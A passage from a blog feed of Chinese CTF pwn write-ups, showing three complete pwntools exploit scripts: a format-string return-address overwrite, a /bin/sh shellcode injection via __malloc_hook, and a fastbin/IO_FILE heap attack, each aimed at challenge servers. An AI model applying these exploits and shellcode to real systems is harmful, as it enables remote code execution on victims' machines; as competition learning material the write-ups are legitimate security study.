class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p=remote(ip,port)</span><br><span class="line">    libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span> , <span class="number">0x4f3c2</span> , <span class="number">0x10a45c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------stack----------------</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(<span class="number">83</span>)+<span class="string">'$p'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$p'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line">con=p.recv()</span><br><span class="line"></span><br><span class="line">leak=int(con[<span class="number">29</span>:<span class="number">41</span>],<span class="number">16</span>)</span><br><span class="line">libc.address=leak<span class="number">-0x21b97</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">leak=int(con[<span class="number">43</span>:<span class="number">55</span>],<span class="number">16</span>)</span><br><span class="line">main_addr=leak<span class="number">-0xe0</span></span><br><span class="line"></span><br><span class="line">rbp_addr=leak<span class="number">-0x200</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"main_addr"</span>,main_addr)</span><br><span class="line">info(<span class="string">"rbp_addr"</span>,rbp_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack=(main_addr&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line">attack=(libc.address+one[<span class="number">1</span>]&amp;<span class="number">0xffff</span>)</span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line">attack=((main_addr+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"></span><br><span class="line">attack=(((libc.address+one[<span class="number">1</span>])&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line">attack=(rbp_addr&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">85</span>)+<span class="string">'$hn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,<span class="string">"Hey Siri!"</span>)</span><br><span class="line"><span class="comment">#dbg(0x12B1)</span></span><br><span class="line"></span><br><span class="line">attack=<span class="number">0xc1</span></span><br><span class="line">info(<span class="string">"attack"</span>,attack)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">"Remind me to "</span>+<span class="string">'%'</span>+str(attack<span class="number">-27</span>)+<span class="string">'s'</span>+<span class="string">'%'</span>+str(<span class="number">0x69</span>+<span class="number">6</span>)+<span class="string">'$hhn'</span></span><br><span class="line">p.sendlineafter(<span class="string">"?\n&gt;&gt;&gt; "</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><p>先泄露出libc_addr，程序申请出了一段固定的可读可写可执行的区域，在里面先填充为shellcode，7功能里面可以溢出修改到<code>__malloc_hook</code>,修改为shellcode的地址即可得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"./oldschool"</span></span><br><span class="line">arch = <span class="string">'32'</span></span><br><span class="line">version = <span class="string">'2.27'</span></span><br><span class="line">ip, port = <span class="string">'106.14.214.3'</span>, <span class="number">2333</span></span><br><span class="line"><span class="comment"># context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment"># context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p=process(pwn_name)</span><br><span class="line">    <span class="comment"># p = process(["/glibc/2.23/64/lib/ld-2.23.so", "./pwn"], env=&#123;"LD_PRELOAD": "/glibc/2.23/64/lib/libc.so.6"&#125;)</span></span><br><span class="line">    <span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwn_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func, libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con, leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con, leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address == <span class="number">0</span>:</span><br><span class="line">        gdb.attach(p,exe=<span class="string">"./oldschool"</span>)</span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script = <span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script = <span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        <span class="comment"># gdb.attach(p, script)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(address)</span>:</span></span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit2</span><span class="params">(idx, val)</span>:</span></span><br><span class="line">    choice(<span class="number">7</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele2</span><span class="params">()</span>:</span></span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_me</span><span class="params">(address,string_me)</span>:</span></span><br><span class="line">    shellcode = string_me + <span class="string">b"\x00"</span> * <span class="number">4</span></span><br><span class="line">    shellcode = shellcode[<span class="number">0</span>:(len(shellcode) // <span class="number">4</span>) * <span class="number">4</span>]</span><br><span class="line">    print(shellcode)</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">0</span>, len(shellcode) , <span class="number">4</span>):</span><br><span class="line">        print(int.from_bytes(shellcode[item:item + <span class="number">4</span>], byteorder=<span class="string">'little'</span>, signed=<span class="keyword">True</span>))</span><br><span class="line">        print(hex(address+i),shellcode[item:item + <span class="number">4</span>])</span><br><span class="line">        edit2(address+i, int.from_bytes(shellcode[item:item + <span class="number">4</span>], byteorder=<span class="string">'little'</span>, signed=<span class="keyword">True</span>))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_index</span><span class="params">(address)</span>:</span></span><br><span class="line">    index = (address - <span class="number">0xe0000000</span>) // <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"><span class="comment"># -------------stack----------------</span></span><br><span class="line"><span class="comment"># add(0, 0x68)</span></span><br><span class="line"><span class="comment"># add(1, 0x68)</span></span><br><span class="line"><span class="comment"># add(2, 0x68)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit(0, 'a' * 0x68 + '\n')</span></span><br><span class="line">shellcode=<span class="string">b"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\xb0\x01\x31\xdb\xcd\x80"</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    add(item,<span class="number">0x90</span>)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    free(item)</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(item,<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_info=p.recvuntil(<span class="string">"\x0a"</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">libc_addr=u32(libc_info[<span class="number">9</span>:<span class="number">9</span>+<span class="number">4</span>])<span class="number">-0x1d8828</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_me(<span class="number">0</span>,shellcode)<span class="comment">#写入shellcode</span></span><br><span class="line">print(hex(libc_addr+<span class="number">0x1d8788</span>))</span><br><span class="line"></span><br><span class="line">write_me(get_index(libc_addr+<span class="number">0x1d8788</span>),p32(<span class="number">0xe0000000</span>))<span class="comment">#malloc_hook</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p>程序没有show功能，还限制了fastbin的大小，利用unsorted bin 攻击 global_max_fast，然后fastbin attack 打iofile，泄露libc_addr,再次fastbin attack打 <code>__malloc_hook</code>为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p=remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#p = process('./easypwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./easypwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-easypwn.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd2</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendafter(<span class="string">"choice:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size:\n"</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">"content:\n"</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"n"</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2--&gt;1</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">"n"</span>*<span class="number">0x80</span>+p64(<span class="number">0x90</span>+<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#5--&gt;4</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#7</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p16(<span class="number">0x37f8</span><span class="number">-0x10</span><span class="number">-0x5</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">2</span>,p8(<span class="number">0x70</span>)+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">7</span>,p16(<span class="number">0x25dd</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,<span class="string">"11"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,<span class="string">"\x00"</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>))</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3c5600</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base = "</span>+hex(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">og = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one = libc_base + og[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">cmd2(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">cmd2(<span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"idx:"</span>,str(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,<span class="string">"n"</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ctf真是秃头爆肝游戏，肝了两天出了六道pwn，pwn题真的太多了，做到不想做。&lt;/p&gt;
&lt;p&gt;最终48名，尽力了，没有进线下。&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://nocbtm.github.io/imgs/ISEE3DP466
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020国赛线上赛 pwn wp</title>
    <link href="https://nocbtm.github.io/2020/08/22/2020%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9B-pwn-wp/"/>
    <id>https://nocbtm.github.io/2020/08/22/2020国赛线上赛-pwn-wp/</id>
    <published>2020-08-22T11:24:30.000Z</published>
    <updated>2020-12-06T02:27:39.000Z</updated>
    
